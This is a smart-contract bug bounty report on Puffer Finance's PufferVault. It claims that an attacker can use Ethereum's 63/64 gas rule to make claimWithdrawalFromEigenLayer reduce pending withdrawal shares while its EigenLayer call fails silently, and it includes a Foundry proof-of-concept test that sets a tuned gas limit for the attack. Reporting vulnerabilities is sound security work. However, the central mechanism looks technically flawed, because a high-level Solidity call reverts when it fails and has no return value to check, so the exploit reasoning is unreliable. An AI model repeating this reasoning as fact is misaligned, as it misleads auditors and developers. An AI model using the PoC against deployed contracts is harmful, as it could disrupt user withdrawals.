# 28732 - \[SC - Insight] External Call from Eigen Layer can fail silentl...

Submitted on Feb 25th 2024 at 12:05:50 UTC by @Cryptor for [Boost | Puffer Finance](https://immunefi.com/bounty/pufferfinance-boost/)

Report ID: #28732

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0xd9a442856c234a39a81a089c06451ebaa4306a72>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

The function claimWithdrawalFromEigenLayer is unprotected and makes an external call to eigen layer at the end of the function without checking the return value. This can result in a possible exploit where a user can call claimWithdrawalFromEigenLayer and pass in just enough gas to reduce the amount of pending shares while the eigenlayer call fails

## Vulnerability Details

Observe the following code

<https://github.com/PufferFinance/pufETH/blob/14b15a3c94b65d895ea08b5faa1cfed0dfc18bd0/src/PufferVault.sol#L222-L243>

The function claimWithdrawalFromEigenLayer allows a user to claim stETH withdrawals from EigenLayer. If fetches some values from Eigen Layer and then makes some checks. Pay attention to the following lines

```
  $.eigenLayerPendingWithdrawalSharesAmount -= queuedWithdrawal.shares[0];

        _EIGEN_STRATEGY_MANAGER.completeQueuedWithdrawal({
            queuedWithdrawal: queuedWithdrawal,
            tokens: tokens,
            middlewareTimesIndex: middlewareTimesIndex,
            receiveAsTokens: true
        });
```

It reduces the pending shares and then makes an external call to Eigen to complete the queued withdrawal of shares. However due to the 1/64th rule in etheruem and the lack of a return value check on the external call, there is a way to make the function pass while making the external call to eigen silently fail causing an erroneous accounting of eigenLayerPendingWithdrawalSharesAmount, which can be reduced without any withdrawal actually taking place.

## Impact Details

A bad actor exploiting this vulnerability could disrupt the withdrawal process. By causing the external call to Eigen to fail while reducing the pending shares, the actor could manipulate the queuing system. This could ultimately lead to withdrawals being delayed or, in worse scenarios, not processed at all.

## References

<https://medium.com/iovlabs-innovation-stories/the-dark-side-of-ethereum-1-64th-call-gas-reduction-ba661778568c>

<https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md>

<https://solodit.xyz/issues/h-08-gas-limit-check-is-inaccurate-leading-to-an-operator-being-able-to-fail-a-job-intentionally-code4rena-holograph-holograph-contest-git>

## Proof of Concept

(Note: The following helper external view function was added to the puffervault contract to fetch share value from the VaultStorage struct to make writing the test easier. Nothing else has changed in the code.)

```
function getvaultwithdrawshares () public view returns (uint) {

          VaultStorage storage $ = _getPufferVaultStorage();

        return $.eigenLayerPendingWithdrawalSharesAmount;
    }
```

Foundry Test (modified test\_withdraw\_from\_eigenlayer):

```
function test_withdraw_from_eigenLayer()
        public
        giveToken(BLAST_DEPOSIT, address(stETH), address(pufferVault), 1000 ether) // Blast got a lot of stETH
    {

         
        // Simulate stETH cap increase call on EL
        _increaseELstETHCap();

        vm.startPrank(OPERATIONS_MULTISIG);
        pufferVault.depositToEigenLayer(stETH.balanceOf(address(pufferVault)));

        uint256 ownedShares = _EIGEN_STRATEGY_MANAGER.stakerStrategyShares(address(pufferVault), _EIGEN_STETH_STRATEGY);

        uint256 assetsBefore = pufferVault.totalAssets();

        // Initiate the withdrawal
        pufferVault.initiateStETHWithdrawalFromEigenLayer(ownedShares);

        // 1 wei diff because of rounding
        assertApproxEqAbs(assetsBefore, pufferVault.totalAssets(), 1, "should remain the same when locked");

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(stETH));

        IStrategy[] memory strategies = new IStrategy[](1);
        strategies[0] = IStrategy(_EIGEN_STETH_STRATEGY);

        uint256[] memory shares = new uint256[](1);
        shares[0] = ownedShares;

        IEigenLayer.WithdrawerAndNonce memory withdrawerAndNonce =
            IEigenLayer.WithdrawerAndNonce({ withdrawer: address(pufferVault), nonce: 0 });

        IEigenLayer.QueuedWithdrawal memory queuedWithdrawal = IEigenLayer.QueuedWithdrawal({
            strategies: strategies,
            shares: shares,
            depositor: address(pufferVault),
            withdrawerAndNonce: withdrawerAndNonce,
            withdrawalStartBlock: uint32(block.number),
            delegatedAddress: address(0)
        });

        // Roll block number + 100k blocks into the future
        vm.roll(block.number + 100000);


        
        
        /*added an external helper function getvaultwithdrawshares to the puffer vault contract to fetch 
        the pendingwithdrawsharesamount */
        uint puffervaultsharesbefore = pufferVault.getvaultwithdrawshares();


        /*Exploits EIP 150 to pass in just enough gas to reduce shares amount while allowing 
        the external call to eigen layer to fail silently 
        */
        uint gasLimit = (gasleft()* 63/64) - 1;

        /* Claim Withdrawal. Final call to Eigen Layer would revert while the erroneous accouting of   shares still remain */
        pufferVault.claimWithdrawalFromEigenLayer{gas: gasLimit}(queuedWithdrawal, tokens, 0);

        //
        uint puffervaultsharesafter = pufferVault.getvaultwithdrawshares();

        assert(puffervaultsharesafter < puffervaultsharesbefore);

       
    }
```
